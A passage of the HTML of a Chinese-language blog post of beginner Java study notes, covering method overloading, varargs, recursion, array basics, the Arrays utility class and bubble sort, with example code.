class="line">    <span class="type">double</span> max=max(<span class="number">30.0</span>,<span class="number">10.0</span>,<span class="number">90.0</span>);</span><br><span class="line">        System.out.println(max);</span><br><span class="line">&#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="type">int</span> <span class="title function_">max</span><span class="params">(<span class="type">int</span> num1,<span class="type">int</span> num2)</span>&#123;</span><br><span class="line">        <span class="type">int</span> result=<span class="number">0</span>;</span><br><span class="line">        <span class="keyword">if</span>(num1==num2)&#123;</span><br><span class="line">            System.out.println(<span class="string">&quot;num1=num2&quot;</span>);</span><br><span class="line">            <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span>(num1&gt;num2)&#123;</span><br><span class="line">            result=num1;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (num1&lt;num2)&#123;</span><br><span class="line">            result=num2;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> result;&#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="type">double</span> <span class="title function_">max</span><span class="params">(<span class="type">double</span> num1,<span class="type">double</span> num2)</span>&#123;</span><br><span class="line">        <span class="type">double</span> result=<span class="number">0</span>;</span><br><span class="line">        <span class="keyword">if</span>(num1==num2)&#123;</span><br><span class="line">            System.out.println(<span class="string">&quot;num1=num2&quot;</span>);</span><br><span class="line">            <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span>(num1&gt;num2)&#123;</span><br><span class="line">            result=num1;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (num1&lt;num2)&#123;</span><br><span class="line">            result=num2;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> result;&#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="type">double</span> <span class="title function_">max</span><span class="params">(<span class="type">double</span> num1,<span class="type">double</span> num2,<span class="type">double</span> num3)</span>&#123;</span><br><span class="line">        <span class="type">double</span> result=<span class="number">0</span>;</span><br><span class="line">        <span class="keyword">if</span>(num1==num2)&#123;</span><br><span class="line">            System.out.println(<span class="string">&quot;num1=num2&quot;</span>);</span><br><span class="line">            <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span>(num1&gt;num2)&#123;</span><br><span class="line">            result=num1;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (num1&lt;num2)&#123;</span><br><span class="line">            result=num2;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span>(num3&gt;num2+num1)&#123;</span><br><span class="line">            System.out.println(<span class="string">&quot;哇哦！这个数也太大了吧！&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> result;&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></div></figure>


        <h4 id="命令行传参">
          <a href="#命令行传参" class="heading-link"><i class="fas fa-link"></i></a><a href="#命令行传参" class="headerlink" title="命令行传参"></a>命令行传参</h4>
      
        <h4 id="可变参数">
          <a href="#可变参数" class="heading-link"><i class="fas fa-link"></i></a><a href="#可变参数" class="headerlink" title="可变参数"></a>可变参数</h4>
      <p>JDK 1.5开始,Java支持传递同类型的可变参数给一个方法。在方法声明中，在指定参数类型后加一个省略号(.….)。<br>一个方法中只能指定一个可变参数，它必须是方法的最后一个参数。任何普通的参数必须在它之前声明。</p>
<figure class="highlight java"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.qingchuan.method;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Demo04</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        Demo04 demo04=<span class="keyword">new</span> <span class="title class_">Demo04</span>();</span><br><span class="line">        demo04.test(<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span>,<span class="number">5</span>,<span class="number">6</span>,<span class="number">7</span>);</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">test</span><span class="params">(<span class="type">int</span>...i)</span>&#123;</span><br><span class="line">        System.out.println(i[<span class="number">0</span>]);</span><br><span class="line">        System.out.println(i[<span class="number">1</span>]);</span><br><span class="line">        System.out.println(i[<span class="number">2</span>]);</span><br><span class="line">        System.out.println(i[<span class="number">3</span>]);</span><br><span class="line">        System.out.println(i[<span class="number">4</span>]);</span><br><span class="line">        System.out.println(i[<span class="number">5</span>]);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></div></figure>


        <h4 id="递归">
          <a href="#递归" class="heading-link"><i class="fas fa-link"></i></a><a href="#递归" class="headerlink" title="递归"></a>递归</h4>
      <blockquote>
<p>A方法调用B方法，我们很容易理解!<br>递归就是:A方法调用A方法!就是自己调用自己<br>利用递归可以用简单的程序来解决一些复杂的问题。它通常把一个大型复杂的问题层层转化为一个与原问题相似的规模较小的问题来求解，递归策略只需少量的程序就可描述出解题过程所需要的多次重复计算，大大地减少了程序的代码量。递归的能力在于用有限的语句来定义对象的无限集合。<br>递归结构包括两个部分:<br>递归头:什么时候不调用自身方法。如果没有头，将陷入死循环。递归体:什么时候需要调用自身方法。</p>
</blockquote>
<figure class="highlight java"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.qingchuan.method;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Demo06</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        System.out.println(f(<span class="number">5</span>));</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="type">int</span> <span class="title function_">f</span><span class="params">(<span class="type">int</span> n)</span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (n==<span class="number">1</span>)&#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">return</span> n*f(n-<span class="number">1</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></div></figure>

<p><img src="/2023/08/24/java%E5%AD%A6%E4%B9%A0/AAwangzhan\blog2\themes\butterfly\source\img\image-20230824115453376.png" alt="image-20230824115453376"></p>
<p>边界条件：边界</p>
<p>前阶段：</p>
<p>返回阶段：n*（n-1）</p>
<p><strong>尽量少用递归，压栈的时候电脑容易崩溃</strong></p>

        <h3 id="数组">
          <a href="#数组" class="heading-link"><i class="fas fa-link"></i></a><a href="#数组" class="headerlink" title="数组"></a>数组</h3>
      <p>数组是相同类型数据的有序集合.<br>数组描述的是相同类型的若干个数据,按照一定的先后次序排列组合而成。<br>其中,每一个数据称作一个数组元素,每个数组元素可以通过一个下标来访问它们.</p>

        <h4 id="数组的声明和创建">
          <a href="#数组的声明和创建" class="heading-link"><i class="fas fa-link"></i></a><a href="#数组的声明和创建" class="headerlink" title="数组的声明和创建"></a>数组的声明和创建</h4>
      <p>首先必须声明数组变量，才能在程序中使用数组。下面是声明数组变量的语法:</p>
<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">dataType[]arrayRefVar;//首选的方法</span><br><span class="line">或</span><br><span class="line">回</span><br><span class="line">dataType arrayRefVar[];1/效果梅同，但不是首选方法</span><br></pre></td></tr></table></div></figure>


<p>Java语言使用new操作符来创建数组，语法如下:</p>
<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">dataType[] arrayRefVar = new dataType[ arraySize];</span><br></pre></td></tr></table></div></figure>

<p>数组的元素是通过索引访问的，数组索引从О开始。<br>获取数组长度:<br>arrays. length</p>
<figure class="highlight java"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.qingchuan.array;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Demo01</span> &#123;</span><br><span class="line">    <span class="comment">//变量得类型  变量的名字=变量的值</span></span><br><span class="line">    <span class="comment">//数组类型</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="type">int</span> [] nums;<span class="comment">//1.声明一个数组</span></span><br><span class="line">        nums=<span class="keyword">new</span> <span class="title class_">int</span>[<span class="number">10</span>];<span class="comment">//2.创建一个数组这里面可以存放10个int类型的数据</span></span><br><span class="line">        <span class="comment">//3.给数组中的元素赋值</span></span><br><span class="line">        nums[<span class="number">0</span>]=<span class="number">1</span>;</span><br><span class="line">        nums[<span class="number">1</span>]=<span class="number">1</span>;</span><br><span class="line">        nums[<span class="number">2</span>]=<span class="number">751</span>;</span><br><span class="line">        nums[<span class="number">3</span>]=<span class="number">16</span>;</span><br><span class="line">        nums[<span class="number">4</span>]=<span class="number">51</span>;</span><br><span class="line">        nums[<span class="number">5</span>]=<span class="number">15</span>;</span><br><span class="line">        nums[<span class="number">6</span>]=<span class="number">14</span>;</span><br><span class="line">        nums[<span class="number">7</span>]=<span class="number">21</span>;</span><br><span class="line">        nums[<span class="number">8</span>]=<span class="number">123</span>;</span><br><span class="line">        nums[<span class="number">9</span>]=<span class="number">1</span>;</span><br><span class="line"></span><br><span class="line">        <span class="type">int</span> sum=<span class="number">0</span>;</span><br><span class="line">        <span class="comment">//计算所有元素的和</span></span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt;nums.length; i++) &#123;</span><br><span class="line">            sum=sum+nums[i];</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        &#125;</span><br><span class="line">        System.out.println(sum);</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></div></figure>

<p>数组的四个基本特点<br>其长度是确定的。数组一旦被创建，它的大小就是不可以改变的。其元素必须是相同类型,不允许出现混合类型。<br>数组中的元素可以是任何数据类型，包括基本类型和引用类型。<br>数组变量属引用类型，数组也可以看成是对象，数组中的每个元素相当于该对象的成员变量。数组本身就是对象，Java中对象是在堆中的，因此数组无论保存原始类型还是其他对象类型,数组对象本身是在堆中的。</p>

        <h4 id="java内存分析">
          <a href="#java内存分析" class="heading-link"><i class="fas fa-link"></i></a><a href="#java内存分析" class="headerlink" title="java内存分析"></a>java内存分析</h4>
      <p><img src="/2023/08/24/java%E5%AD%A6%E4%B9%A0/AAwangzhan\blog2\themes\butterfly\source\img\image-20230824163338365.png" alt="image-20230824163338365"></p>
<blockquote>
<p>三种初始化</p>
<p>静态初始化<br>int[] a &#x3D; {1,2,3];<br>Man[ ] mans &#x3D; {new Man(1,1) ,new Man(2,2)};<br>动态初始化<br>int[] a &#x3D; new int[2];a[0]&#x3D;1;<br>a[1]&#x3D;2;<br>数组的默认初始化<br>数组是引用类型，它的元素相当于类的实例变量，因此数组一经分配空间，其中的每个元素也被按照实例变量同样的方式被隐式初始化。</p>
</blockquote>
<p><img src="/2023/08/24/java%E5%AD%A6%E4%B9%A0/AAwangzhan\blog2\themes\butterfly\source\img\image-20230824172553805.png" alt="image-20230824172553805"></p>
<p>数组是相同数据类型(数据类型可以为任意类型)的有序集合数组也是对象。数组元素相当于对象的成员变量<br>数组长度的确定的，不可变的。如果越界，则报:ArraylndexOutofBounds</p>

        <h4 id="数组的使用">
          <a href="#数组的使用" class="heading-link"><i class="fas fa-link"></i></a><a href="#数组的使用" class="headerlink" title="数组的使用"></a>数组的使用</h4>
      <figure class="highlight java"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.qingchuan.array;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">ArraryDemo03</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="type">int</span> []arrays=&#123;<span class="number">14</span>,<span class="number">22</span>,<span class="number">3342</span>,<span class="number">4</span>,<span class="number">545</span>&#125;;</span><br><span class="line"></span><br><span class="line">        <span class="comment">//打印出来全部的数组数据</span></span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">0</span>;i&lt;arrays.length;i++)&#123;</span><br><span class="line">            System.out.println(arrays[i]);</span><br><span class="line">        &#125;</span><br><span class="line">        System.out.println(<span class="string">&quot;------------&quot;</span>);</span><br><span class="line">        <span class="comment">//计算所有元素的和</span></span><br><span class="line">        <span class="type">int</span> sum=<span class="number">0</span>;</span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">0</span>;i&lt;arrays.length;i++)&#123;</span><br><span class="line">            sum=sum+arrays[i];</span><br><span class="line">        &#125;</span><br><span class="line">        System.out.println(<span class="string">&quot;sum=&quot;</span>+sum);</span><br><span class="line">        <span class="comment">//查找最大元素</span></span><br><span class="line">        System.out.println(<span class="string">&quot;    查找最大元素   &quot;</span>);</span><br><span class="line">        <span class="type">int</span> max=arrays[<span class="number">0</span>];</span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">0</span>;i&lt;arrays.length;i++)&#123;</span><br><span class="line">            <span class="keyword">if</span>(arrays[i]&gt;max)&#123;</span><br><span class="line">                max=arrays[i];</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        System.out.println(<span class="string">&quot;max=&quot;</span>+max);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></div></figure>

<figure class="highlight java"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.qingchuan.array;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">ArrayDemo04</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="type">int</span>[] arrays = &#123;<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">5</span>, <span class="number">7</span>&#125;;</span><br><span class="line">        <span class="comment">//JDK1,5  没有下标</span></span><br><span class="line"><span class="comment">//        for (int array : arrays) &#123;</span></span><br><span class="line"><span class="comment">//            System.out.println(array);</span></span><br><span class="line"><span class="comment">//</span></span><br><span class="line"><span class="comment">//        &#125;</span></span><br><span class="line">        printArrary(arrays);</span><br><span class="line">        <span class="type">int</span>[] reverse=reverse(arrays);</span><br><span class="line">        printArrary(reverse);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//打印数组元素</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">printArrary</span><span class="params">(<span class="type">int</span>[] arrays)</span> &#123;</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; arrays.length; i++) &#123;</span><br><span class="line">            System.out.print(arrays[i] + <span class="string">&quot; &quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//反转数组</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="type">int</span>[] reverse(<span class="type">int</span>[] arrays) &#123;</span><br><span class="line">        <span class="type">int</span>[] result=<span class="keyword">new</span> <span class="title class_">int</span>[arrays.length];</span><br><span class="line"></span><br><span class="line">        <span class="comment">//反转的操作</span></span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">0</span>,j=result.length-<span class="number">1</span>;i&lt;arrays.length;i++,j--)&#123;</span><br><span class="line">            result[j]=arrays[i];</span><br><span class="line"></span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> result;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></div></figure>


        <h4 id="多维数组">
          <a href="#多维数组" class="heading-link"><i class="fas fa-link"></i></a><a href="#多维数组" class="headerlink" title="多维数组"></a>多维数组</h4>
      <p>多维数组可以看成是数组的数组，比如一个二维数组</p>
<p><img src="/2023/08/24/java%E5%AD%A6%E4%B9%A0/AAwangzhan\blog2\themes\butterfly\source\img\image-20230825155338196.png" alt="image-20230825155338196"></p>
<p>####Arrays类<br>数组的工具类java.util.Arrays<br>由于数组对象本身并没有什么方法可以供我们调用,但API中提供了一个工具类Arrays供我们使用,从而可以对数据对象进行一些基本的操作。<br>查看JDK帮助文档<br>Arrays类中的方法都是static修饰的静态方法,在使用的时候可以直接使用类名进行调用,而”不用”使用对象来调用(注意:是”不用”而不是”不能”)<br>具有以下常用功能:<br>给数组赋值:通过fil方法。<br>对数组排序:通过sort方法,按升序。<br>比较数组:通过equals方法比较数组中元素值是否相等。<br>◆查找数组元素:通过binarySearch方法能对排序好的数组进行二分查找法操作。</p>
<figure class="highlight java"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.qingchuan.array;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.util.Arrays;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">ArrayDemo06</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="type">int</span> [] a=&#123;<span class="number">7</span>,<span class="number">3</span>,<span class="number">34</span>,<span class="number">12</span>,<span class="number">6</span>,<span class="number">12</span>,<span class="number">612</span>,<span class="number">5</span>&#125;;</span><br><span class="line">        System.out.println(a);<span class="comment">//[I@1b6d3586</span></span><br><span class="line">        <span class="comment">//打印数组元素</span></span><br><span class="line">        Arrays.sort(a);<span class="comment">//排序</span></span><br><span class="line">        System.out.println(Arrays.toString(a));</span><br><span class="line">        printArray(a);</span><br><span class="line">        Arrays.fill(a,<span class="number">2</span>,<span class="number">5</span>,<span class="number">0</span>);</span><br><span class="line">        System.out.println(Arrays.toString(a));</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">printArray</span><span class="params">(<span class="type">int</span>[] a)</span>&#123;</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> i=<span class="number">0</span>;i&lt;a.length;i++)&#123;</span><br><span class="line">            <span class="keyword">if</span>(i==<span class="number">0</span>)&#123;</span><br><span class="line">                System.out.print(<span class="string">&quot;[&quot;</span>);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">if</span>(i==a.length-<span class="number">1</span>)&#123;</span><br><span class="line">                System.out.print(a[i]+<span class="string">&quot;]&quot;</span>);</span><br><span class="line">            &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            System.out.print(a[i]+<span class="string">&quot;,&quot;</span>);</span><br><span class="line">        &#125;&#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></div></figure>


        <h4 id="冒泡排序">
          <a href="#冒泡排序" class="heading-link"><i class="fas fa-link"></i></a><a href="#冒泡排序" class="headerlink" title="冒泡排序"></a>冒泡排序</h4>
      <figure class="highlight java"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.qingchuan.array;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.util.Arrays;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">ArrayDemo07</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="type">int</span>[] b=&#123;<span class="number">7</span>,<span class="number">3</span>,<span class="number">65</span>,<span class="number">2</span>,<span class="number">65</span>,<span class="number">34</span>,<span class="number">74</span>&#125;;</span><br><span class="line">        <span class="type">int</span>[] sort=sort(b);</span><br><span class="line">        System.out.println(Arrays.toString(sort));</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//冒泡排序</span></span><br><span class="line">    <span class="comment">//1.比较数组中，两个相邻的元素，如果第一个数比第二个数组大，我们就交换它们的位置</span></span><br><span class="line">    <span class="comment">//2.没出一次比较，都会产生一个最大，或者最小的数字</span></span><br><span class="line">    <span class="comment">//3.下一轮可以少一次排序</span></span><br><span class="line">    <span class="comment">//4.以此循环直到结束</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="type">int</span> [] sort(<span class="type">int</span>[] array)&#123;</span><br><span class="line">        <span class="comment">//外层循环，判断走多少次</span></span><br><span class="line">        <span class="type">int</span> t=<span class="number">0</span>;</span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">0</span>;i&lt;array.length-<span class="number">1</span>;i++)&#123;</span><br><span class="line">            <span class="type">boolean</span> <span class="variable">flag</span> <span class="operator">=</span><span class="literal">false</span>;<span class="comment">//通过flag标识为减少没有意义的比较</span></span><br><span class="line">            <span class="comment">//内存循环，比较判断两个数，如果第一个数，比第二个数打，则交换</span></span><br><span class="line">             <span class="keyword">for</span>(<span class="type">int</span> j=<span class="number">0</span>;j&lt;array.length-<span class="number">1</span>-i;j++)&#123;</span><br><span class="line">                 <span class="keyword">if</span> (array[j+<span class="number">1</span>]&lt;array[j])&#123;</span><br><span class="line">                     t=array[j];</span><br><span class="line">                     array[j]=array[j+<span class="number">1</span>];</span><br><span class="line">                     array[j+<span class="number">1</span>]=t;</span><br><span class="line">                     flag=<span class="literal">true</span>;</span><br><span class="line"></span><br><span class="line">                 &#125;</span><br><span class="line">             &#125;</span><br><span class="line">             <span class="keyword">if</span>(flag==<span class="literal">false</span>)&#123;</span><br><span class="line">                 <span class="keyword">break</span>;</span><br><span class="line">             &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> array;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></div></figure>


        <h4 id="稀疏数组">
          <a href="#稀疏数组" class="heading-link"><i class="fas fa-link"></i></a><a href="#稀疏数组" class="headerlink" title="稀疏数组"></a>稀疏数组</h4>
      <p><img src="/2023/08/24/java%E5%AD%A6%E4%B9%A0/AAwangzhan\blog2\themes\butterfly\source\img\image-20230825174855519.png"></p>
<p>当一个数组中大部分元素为0，或者为同一值的数组时，可以使用稀疏数组来保存该数组。稀疏数组的处理方式是:<br>记录数组一共有几行几列，有多少个不同值<br>把具有不同值的元素和行列及值记录在一个小规模的数组中，从而缩小程序的规模如下图:左边是原始数组，右边是稀疏数组</p>
<p><img src="/2023/08/24/java%E5%AD%A6%E4%B9%A0/AAwangzhan\blog2\themes\butterfly\source\img\image-20230825175125458.png"></p>
<figure class="highlight java"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span 